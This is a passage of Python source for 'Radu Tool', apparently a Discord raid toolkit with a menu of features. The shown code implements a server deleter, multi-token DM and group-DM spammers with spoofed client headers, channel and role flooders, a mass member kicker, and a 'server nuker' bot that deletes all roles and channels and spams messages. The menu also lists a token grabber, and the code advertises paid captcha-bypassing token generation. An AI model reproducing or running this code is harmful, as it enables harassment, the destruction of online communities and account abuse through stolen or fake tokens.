                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel
                text = mess
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
            thread() 
def radutool2():
    username = getpass.getuser()
    tokens = len(open('tokens.txt').readlines())
    System.Clear()
    ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Tokens : [{tokens}] | Page 2')
    Write.Print(f'''
    \t\t     /$$$$$$$                  /$$                 /$$$$$$$$                  /$$
    \t\t    | $$__  $$                | $$                |__  $$__/                 | $$
    \t\t    | $$  \ $$  /$$$$$$   /$$$$$$$ /$$   /$$         | $$  /$$$$$$   /$$$$$$ | $$
    \t\t    | $$$$$$$/ |____  $$ /$$__  $$| $$  | $$         | $$ /$$__  $$ /$$__  $$| $$
    \t\t    | $$__  $$  /$$$$$$$| $$  | $$| $$  | $$         | $$| $$  \ $$| $$  \ $$| $$
    \t\t    | $$  \ $$ /$$__  $$| $$  | $$| $$  | $$         | $$| $$  | $$| $$  | $$| $$ 
    \t\t    | $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$/         | $$|  $$$$$$/|  $$$$$$/| $$
    \t\t    |__/  |__/ \_______/ \_______/ \______/          |__/ \______/  \______/ |__/    
    \t\t\t[ > discord.gg/radutool | Welcome {username} | github.com/H4cK3dR4Du < ]\n''', Colors.purple_to_red, interval=0.000)
    Write.Print(f"""══════════════════════════════════════════════════════|Page 2|═════════════════════════════════════════════════════════
\t\t[30] Server Deleter\t\t[41] Fake Typing\t\t[52] Boost Tool
\t\t[31] Token Theme Cycler\t\t[42] Channel Creator\t\t[53] Multi Webhook Spammer
\t\t[32] Server Checker\t\t[43] Role Creator\t\t[54] DM Sender
\t\t[33] DM Spammer\t\t\t[44] Server MassDM\t\t[55] Account Checker
\t\t[34] Token Reporter\t\t[45] Kick Members\t\t[56] PFP Changer
\t\t[35] Server Lookup\t\t[46] Server Nuker\t\t[57] DM Deleter
\t\t[36] Hypesquad Changer\t\t[47] Thread Message Spam\t[58] Discord Temp Mail
\t\t[37] Bot Onliner\t\t[48] Ticket Spammer\t\t[59] Token Grabber
\t\t[38] GroupDM Spammer\t\t[49] Channel Lagger\t\t[60] Token Information
\t\t[39] Token Generator\t\t[50] Webhook Embed\t\t[<]  """, Colors.purple_to_red, interval=0.000), print(f"{pink}Previous Page")
    Write.Print(f"""\t\t[40] Channel Auto Typing\t[51] Reaction Spammer\t\t[>]  """, Colors.purple_to_red, interval=0.000), print(f"{pink}Next Page")
    Write.Print(f"════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_red, interval=0.000)
    Write.Print(f"\nroot@radutool ~> ", Colors.purple_to_red, interval=0.000); opc = input(purple)
    option_list = ["<", ">", "30", "31", "32", "33", "34", "35", "36", "37", "38", "39", "40", "41", "42", "43", "44", "45", "46", "47", "48", "49", "50", "51", "52", "53", "54", "55", "56", "57", "58", "59", "60"]
    if opc not in option_list:
        print(f"\n{purple}[{red}Error{purple}]{reset} Invalid Option!")
        time.sleep(0.5)
        radutool2()
    if opc=="<":
        radutool()
    if opc==">":
        radutool3()
    if opc=="30":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Deleter')
        def deleteServers(token):
            guildsIds = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=getheaders(token)).json()
            for guild in guildsIds:
                try:
                    requests.delete(f'https://discord.com/api/v9/guilds/'+guild['id'], headers={'Authorization': token})
                    print(f'{purple}[{green}+{purple}]{reset} Deleted | {blue}'+guild['name'])
                except Exception as error:
                    print(f"{purple}[{red}-{purple}]{reset} Error : {error}")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        deleteServers(token)
    if opc=="31":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Theme Cycler')
        try:
            token = input(f'\n{purple}[{red}>{purple}]{reset} Token : ')
            amount = input(f'{purple}[{red}>{purple}]{reset} How Much Cycles? : ')
            modes = cycle(["light", "dark"])
            headers = {'Authorization': token, 'Content-Type': 'application/json'}  
            for i in range(amount):
                time.sleep(0.15)
                setting = {'theme': next(modes)}
                requests.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json=setting)
                print(f'{purple}[{green}+{purple}]{reset} Token Successfully Changed Theme | {blue}{modes}')
        except:
                input(f"\n{purple}[{red}-{purple}]{reset} Error...\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
                radutool2()
    if opc=="32":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Checker')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        print()
        with open('data/guild_ids.txt', 'r') as f:
            guild_ids = f.read().splitlines()

        headers = {
            'Authorization': f'{token}'
        }

        base_url = 'https://discord.com/api/v9/guilds/'
        for guild_id in guild_ids:
            url = f'{base_url}{guild_id}'
            response = requests.get(url, headers=headers)
            if response.status_code == 200:
                print(f'{purple}[{green}+{purple}]{reset} Valid Guild ID | {blue}{guild_id}')
            else:
                print(f'{purple}[{red}-{purple}]{reset} Invalid Guild ID | {blue}{guild_id}')
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool2()
    if opc=="33":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | DM Spammer')
        def DMSpammer(idd, message, token):
            headers = {
                'Authorization': token,
                "accept": "*/*",
                "accept-language": "en-GB",
                "content-length": "90",
                "content-type": "application/json",
                "cookie": f"__cfuid={randstr(43)}; __dcfduid={randstr(32)}; locale=en-US",
                "origin": "https://discord.com",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                "x-debug-options": "bugReporterEnabled",
                "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
            }

            payload = {'recipient_id': idd}
            r1 = requests.post(f'https://discordapp.com/api/v9/users/@me/channels', headers=headers,
                               json=payload)

            if chrr == 'y':
                message += " | " + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
            elif chrr == 'n':
                pass
            else:
                pass

            payload = {"content": message, "tts": False}
            j = json.loads(r1.content)

            while True:
                r2 = requests.post(f"https://discordapp.com/api/v9/channels/{j['id']}/messages",
                                   headers=headers, json=payload)

                if r2.status_code == 429:
                    ratelimit = json.loads(r2.content)
                    print(f"{purple}[{red}-{purple}]{reset} Ratelimited For", str(float(ratelimit['retry_after'])) + " Seconds")
                    time.sleep(float(ratelimit['retry_after']))

                elif r2.status_code == 200:
                    print(f"{purple}[{green}+{purple}]{reset} DM Sent | {blue}{token}{reset} | {blue}{idd}")

        tokens = open("tokens.txt", "r").read().splitlines()
        user = input(f"\n{purple}[{red}>{purple}]{reset} User ID : {red}")
        message = input(f"{purple}[{red}>{purple}]{reset} Message : {red}")
        chrr = input(f'{purple}[{red}>{purple}]{reset} Random Letters? y/n : ').lower()

        def thread():
            for token in tokens:
                threading.Thread(target=DMSpammer, args=(user, message, token)).start()
        thread()
        time.sleep(1000)
        input(f'\n{purple}[{red}>{purple}]{reset} Press ENTER : ')
        radutool2()
    if opc=="34":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Reporter')
        def massreporter():
            token = input(f"{purple}[{red}>{purple}]{reset} Token : ")
            guild_id = input(f"{purple}[{red}>{purple}]{reset} Server ID : ")
            channel_id = input(f"{purple}[{red}>{purple}]{reset} Channel ID : ")
            message_id = input(f"{purple}[{red}>{purple}]{reset} Message ID : ")
            Write.Print(f"""
[1] Illegal Content
[2] Harassment
[3] Spam / Phising
[4] Self Harm
[5] Content Nsfw""", Colors.purple_to_red, interval=0.000)
            reasonn = input(f"\n{purple}[{red}>{purple}]{reset} Reason : ")
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36',
                'Authorization': f'{token}',
                'Content-Type': 'application/json'
                        }
            reasons = {
                'channel_id': channel_id,
                'guild_id': guild_id,
                'message_id': message_id,
                'reason': reasonn
                    }
            report = requests.post('https://discord.com/api/v9/report', headers=headers, json=reasons)
            if report == 201:
                print(f'{purple}[{green}+{purple}]{reset} Report Sent!')
            else:
                print(f"{purple}[{red}-{purple}]{reset} Error")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        massreporter()
    if opc=="35":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Lookup')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        guild = input(f"{purple}[{red}>{purple}]{reset} Guild ID : ")
        url = f'https://discord.com/api/guilds/{guild}'
        headers = {
            'Authorization': f'{token}',
            'Content-Type': 'application/json'
        }

        response = requests.get(url, headers=headers)
        response_data = response.json()
        print()
        print(f'{purple}[{green}+{purple}]{reset} Name | {blue}{response_data["name"]}')
        print(f'{purple}[{green}+{purple}]{reset} Server ID | {blue}{guild}')
        print(f"{purple}[{green}+{purple}]{reset} Icon URL | {blue}https://cdn.discordapp.com/icons/{guild}/{response_data['icon']}.webp?size=256")
        print(f"{purple}[{green}+{purple}]{reset} Owner ID | {blue}{response_data['owner_id']}")
        print(f"{purple}[{green}+{purple}]{reset} Description | {blue}{response_data['description']}")
        print(f"{purple}[{green}+{purple}]{reset} Region | {blue}{response_data['region']}")
        print(f"{purple}[{green}+{purple}]{reset} Role Count | {blue}{len(response_data['roles'])}")
        print(f"{purple}[{green}+{purple}]{reset} Vanity Invite | {blue}{response_data['vanity_url_code']}")
        time.sleep(0.2)
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool2()
    if opc=="36":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Hypesquad Changer')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        Write.Print(f"""
[1] Bravery
[2] Brilliance
[3] Balance""", Colors.purple_to_red, interval=0.0000)
        hypesquad = input(f"\n{purple}[{red}>{purple}]{reset} Hypesquad : ")
        if hypesquad=="1":
            hype_id = 1
        if hypesquad=="2":
            hype_id = 2
        if hypesquad=="3":
            hype_id = 3
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }
        data = {
            "house_id": hype_id
        }
        response = requests.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json=data)
        if response.status_code == 204:
            print()
            print(f"{purple}[{green}+{purple}]{reset} Successfully Changed Hypesquad | {blue}{token}")
        else:
            print()
            print(f"{purple}[{red}-{purple}]{reset} Error")
        input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
        radutool2()
    if opc=="37":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Bot Onliner')
        bottoken = input(f'\n{purple}[{red}>{purple}]{reset} Bot Token : ')
        client = discord.Client()
        @client.event
        async def on_ready():
            pass 
        @client.event
        async def on_message(message):
            if message.author == client.user:
                return    
            if message.content.startswith('!radu'):
                await message.channel.send('Hello! Im Conected Using Radu Tool!')

        client.run(bottoken)
        print(f"\n{purple}[{green}+{purple}]{reset} Successfully Connected | {blue}{token}")
        time.sleep(0.2)
        input(f'\n{purple}[{red}>{purple}]{reset} Press ENTER : ')
        radutool2()
    if opc=="38":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | GroupDM Spammer')
        token = input(f'\n{purple}[{red}>{purple}]{reset} Token : ')
        groupname = input(f'{purple}[{red}>{purple}]{reset} Group Name : ')
        print()
        headers = {
        "authorization": token,
        "accept": "*/*",
        'accept-encoding': 'gzip, deflate, br',
        "accept-language": "en-GB",
        "content-length": "90",
        "content-type": "application/json",
        "cookie": f"__cfuid={random2(43)}; __dcfduid={random2(32)}; locale=en-US",
        "origin": "https://discord.com",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
        "x-debug-options": "bugReporterEnabled",
        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"
    }
        for i in range(10000):
            try:
                response_recipients = requests.post('https://discord.com/api/v9/users/@me/channels', headers=headers, json={"recipients": []})
                newjson = json.loads(response_recipients.content)
                id = newjson['id']
                time.sleep(0.2)
                response = requests.patch(f'https://discord.com/api/v9/channels/{id}', headers=headers, json={'name': groupname})
                if response.status_code == 200:
                    print(f'{purple}[{green}+{purple}]{reset} Successfully Created Group | {groupname}')
            except:
                print(f'{purple}[{red}-{purple}]{reset} RateLimited For {newjson["retry_after"]} Seconds')
                time.sleep(newjson['retry_after'])
    if opc=="39":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Token Generator [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Token Generator Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} The token generator It has Captcha Solver, accepts APIs keys from Capmonster, Capsolver and Anti-Captcha, is the only generator on the market that generates unflagged and unlocked tokens using HQ Proxies and with email verification included.")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="3":
            radutool2()
    if opc=="40":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Channel Automatic Typing')
        def typing():
            token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
            channel7 = input(f"{purple}[{red}>{purple}]{reset} Channel ID : ")
            mess7 = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            delay = int(input(f"{purple}[{red}>{purple}]{reset} Delay : "))
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            url = f"https://discord.com/api/v9/channels/{channel7}/messages"
            while True:
                data = {"content": mess7}
                header = {"authorization": token}
                time.sleep(delay)
                r = requests.post(url, data=data, headers=header, proxies=proxies)
                if r.status_code == 200:
                    print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                else:
                    print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")                                      
        typing()
    if opc=="41":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Fake Typing')
        channel = input(f"\n{purple}[{red}>{purple}]{reset} Channel ID : ")
        print()
        with open('tokens.txt') as fake:
            tokens = fake.read().splitlines()
        while True:
            for token in tokens:
                headers = {'Authorization': token,
                        'User-Agent': useragent,
                        'Origin': 'discord.com',
                        'Accept': '*/*',
                        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImRlIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExMC4wLjAuMCBTYWZhcmkvNTM3LjM2IEVkZy8xMTAuMC4xNTg3LjY5IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTEwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjE4MDEzNSwiY2xpZW50X2V2ZW50X3NvdXJjZSI6bnVsbCwiZGVzaWduX2lkIjowfQ==',
                        'Accept-Language': 'de,de-DE;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
                        "sec-fetch-dest": "empty",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-site": "same-origin",
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9003 Chrome/91.0.4472.164 Electron/13.4.0 Safari/537.36",
                        "x-debug-options": "bugReporterEnabled",
                        "x-super-properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAzIiwib3NfdmVyc2lvbiI6IjEwLjAuMjI0NjMiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6InNrIiwiY2xpZW50X2J1aWxkX251bWJlciI6OTkwMTYsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9",
                        }
                response = requests.post(f'https://discord.com/api/v9/channels/{channel}/typing', headers=headers)
                if response.status_code == 204:
                    print(f'{purple}[{green}+{purple}]{reset} Typing | {blue}{token}')
                else:
                    print(f'{purple}[{red}-{purple}]{reset} Error Typing | {blue}{token}')     
    if opc=="42":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Channel Creator')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        guild = input(f"{purple}[{red}>{purple}]{reset} Server ID : ")
        name = input(f"{purple}[{red}>{purple}]{reset} Channels Name : ")
        typechannel = input(f"{purple}[{red}>{purple}]{reset} Voice/Text Channel? : ").lower()
        print()
        if typechannel=="text":
            typechannel = 0
        if typechannel=="voice":
            typechannel = 2
        intents = discord.Intents.all()
        intents.members = True
        headers = {'Authorization': f'{token}'}
        client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
        client.remove_command("help")
        def SpamChannels():
            while True:
                json = {'name': name, 'type': typechannel}
                r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        print(f"{purple}[{green}+{purple}]{reset} Created Channel | {blue}{name}")
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Create | {blue}{name}")
                        pass 
        SpamChannels()
    if opc=="43":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Role Creator')
        token = input(f"\n{purple}[{red}>{purple}]{reset} Token : ")
        guild = input(f"{purple}[{red}>{purple}]{reset} Server ID : ")
        name = input(f"{purple}[{red}>{purple}]{reset} Role Name : ")
        print()
        intents = discord.Intents.all()
        intents.members = True
        headers = {'Authorization': f'{token}'}
        client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
        client.remove_command("help")
        while True:
            json = {'name': name}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/roles', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{purple}[{green}+{purple}]{reset} Created Role | {blue}{name}")
                else:
                    pass
    if opc=="44":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server MassDM [Paid Version]')
        print(f"\n{purple}[{red}!{purple}]{reset} Server MassDM Is On Radu Tool Paid Version...")
        Write.Print(f"""
[1] Visit Shop
[2] What Does It Contain?
[3] Back
        """, Colors.purple_to_red, interval=0.000)
        shop = input(f"\n{purple}[{red}>{purple}]{reset} Option : ")
        if shop=="1":
            webbrowser.open('https://radutool.sellix.io')
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="2":
            print(f"\n{purple}[{red}>{purple}]{reset} The Server MassDM It has Captcha Solver, accepts APIs keys from Capmonster, Capsolver and Anti-Captcha, Open DMS and send messages at the same time, using proxies! Your token will not be blocked under any circumstances, in addition the MassDM supports more than 100k member ids.")
            input(f"\n{purple}[{red}>{purple}]{reset} Press ENTER : ")
            radutool2()
        if shop=="3":
            radutool2()
    if opc=="45":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Kick Members')
        def KickMembers(guild, member):
            while True:
                response = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/members/{member}", headers=headers)
                if 'retry_after' in response.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if response.status_code == 200 or response.status_code == 201 or response.status_code == 204:
                        print(f"{purple}[{green}+{purple}]{reset} Successfully Kicked | {blue}{member.strip()}")
                        pass
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Kick | {blue}{member.strip()}")
                        pass
        guild = input(f'{purple}[{red}>{purple}]{reset} Server ID : ')
        print()
        members = open('data/users.txt')
        for member in members:
            threading.Thread(target=KickMembers, args=(guild, member)).start()
        members.close()
    if opc=="46":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Server Nuker')
        def servernuker():
                            guild = input(f"\n{purple}[{red}>{purple}]{reset} Server ID : ")
                            botstatus = input(f"{purple}[{red}>{purple}]{reset} Bot Status : ")
                            prefix = input(f"{purple}[{red}>{purple}]{reset} Bot Prefix : ")
                            token = input(f"{purple}[{red}>{purple}]{reset} Bot Token : ")
                            servername = input(f"{purple}[{red}>{purple}]{reset} Custom Server Name : ")
                            rolename = input(f"{purple}[{red}>{purple}]{reset} Role Name : ")
                            channelsname = input(f"{purple}[{red}>{purple}]{reset} Channel Name : ")
                            spammessage = input(f"{purple}[{red}>{purple}]{reset} Message : ")
                            radu = commands.Bot(command_prefix=prefix, intents=discord.Intents().all())
                            radu.remove_command('help')
                            @radu.event
                            async def on_ready():
                                if len(radu.guilds) > 1:
                                    guildpl = "guilds"
                                else:
                                    guildpl = "guild"
                                activity = discord.Game(name=botstatus, type=3)
                                await radu.change_presence(status=discord.Status.dnd, activity=activity)
                                System.Clear()
                                Write.Print(f"""
\t\t        ██████╗  █████╗ ██████╗ ██╗   ██╗    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
\t\t        ██╔══██╗██╔══██╗██╔══██╗██║   ██║    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
\t\t        ██████╔╝███████║██║  ██║██║   ██║    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
\t\t        ██╔══██╗██╔══██║██║  ██║██║   ██║    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
\t\t        ██║  ██║██║  ██║██████╔╝╚██████╔╝    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
\t\t        ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝  ╚═════╝     ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝                                                          
                                """, Colors.purple_to_red, interval=0.000)
                                print(f"")
                                print(f"{purple}[{red}>{purple}]{reset} Bot : {radu.user} ({len(radu.guilds)} {guildpl})")
                                print(f"{purple}[{red}>{purple}]{reset} Prefix : {prefix}")
                                print(f"{purple}[{red}>{purple}]{reset} Spam Message : {spammessage}")
                                print(f"{purple}[{red}>{purple}]{reset} Channels Name : {channelsname}")
                                print(f"{purple}[{red}>{purple}]{reset} Bot Status : {botstatus}")
                                print(f"{purple}[{red}>{purple}]{reset} Roles Name : {rolename}")
                                print(f"{purple}[{red}>{purple}]{reset} Guild Name : {servername}")
                                print(f"{purple}[{red}>{purple}]{reset} Guild ID : {guild}\n")
                                print(f"{purple}[{yellow}%{purple}]{reset} Type: {blue}{prefix}nuke{reset} In a channel for start the nuker.")
                                print()
                            @radu.event
                            async def on_guild_channel_create(channel):
                                while True:
                                    await channel.send(spammessage)
                                    print(f"{purple}[{green}+{purple}]{reset} Successfully Sent Message | {blue}{spammessage}")

                            @radu.event
                            async def on_guild_join(guild):
                                for channel in guild.text_channels:
                                    if channel.permissions_for(guild.me).create_instant_invite:
                                        invite = await channel.create_invite()
                                        break
                                print(f"{purple}[{green}+{purple}]{reset} Successfully Joined Guild | {blue}{guild.name}")

                            @radu.command()
                            async def nuke(ctx):
                                await ctx.message.delete()
                                await ctx.guild.edit(name=servername)
                                for role in ctx.guild.roles:
                                    try:
                                        await role.delete()
                                        print(f"{purple}[{green}+{purple}]{reset} Successfully Deleted | {blue}@{role.name}")
                                    except:
                                        pass
                                        print(f"{purple}[{red}-{purple}]{reset} Couldn't Delete | {blue}@{role.name}")

                                for channel in ctx.guild.channels:
                                    try:
                                        await channel.delete()
                                        print(f"{purple}[{green}+{purple}]{reset} Successfully Deleted | {blue}#{channel.name}")
                                    except:
                                        pass
                                        print(f"{purple}[{red}-{purple}]{reset} Couldn't Delete | {blue}#{channel.name}")
                                try:
                                    for i in range(50):
                                        await ctx.guild.create_text_channel(channelsname)
                                        print(f"{purple}[{green}+{purple}]{reset} Created | {blue}#{channel.name}")
                                except Exception as er: 
                                    print(f"{purple}[{red}-{purple}]{reset} Error | {blue}{er}")
                            try:
                                radu.run(token)
                            except Exception as error:
                                pass
                                print(f"{purple}[{red}!{purple}]{reset} Error Connecting The Bot | {blue}{error}")
                                input(f"\n{purple}[{red}!{purple}]{reset} Press ENTER : ")
                                radutool2()
        while True:
            servernuker()
    if opc=="47":
        ctypes.windll.kernel32.SetConsoleTitleW(f'Radu Tool | Starting Menu | discord.gg/radutool | Made By : H4cK3dR4Du#0001 | Thread Message Spammer')
        def raider():  
            channel7 = input(f"\n{purple}[{red}>{purple}]{reset} Thread ID : ")
            mess7 = input(f"{purple}[{red}>{purple}]{reset} Message : ")
            randomemoji = input(f"{purple}[{red}>{purple}]{reset} Random Emojis? y/n : ")
            if randomemoji=="y":
                randomemoji = True
            elif randomemoji=="n":
                randomemoji = False
            radulist = ['😀', '🤡', '🥶', '😍', '💀', '🔥', '😭', '🐍', '🤑', '💰', '❤️', '😴', '😈', '🎉', '🤢', '🫂', '🙀', '😭', '🍸', '🥥', '🌴']
            delay = "0"
            tokens = open("tokens.txt", "r").read().splitlines()
            proxies = open("Data/proxies.txt", "r").read().splitlines()               
            def spam(token, channel7, mess7):
                url = f"https://discord.com/api/v9/channels/{channel7}/messages"
                while True:
                    caracteres = string.ascii_letters + string.digits
                    cadena_aleatoria = ''.join(random.choices(caracteres, k=10))
                    selected_emojis = random.sample(radulist, 8)
                    selected_emojis_str = ' '.join(selected_emojis)
                    data = {"content": mess7 + f' | {selected_emojis_str} - {cadena_aleatoria}'}
                    header = {"authorization": token}
                    time.sleep(0.0001)
                    r = requests.post(url, data=data, headers=header, proxies=proxies)
                    if r.status_code == 200:
                        print(f'{purple}[{green}+{purple}]{reset} Sent Message | {blue}{token}')
                    else:
                        print(f"{purple}[{red}-{purple}]{reset} Failed To Send Message | {blue}{token}")              
            def thread():
                channel_id = channel7
                text = mess7
                for token in tokens:
                    time.sleep(int(delay))
                    threading.Thread(target=spam, args=(token, channel_id, text)).start()
            thread()                         
        raider()
    if opc=="48":
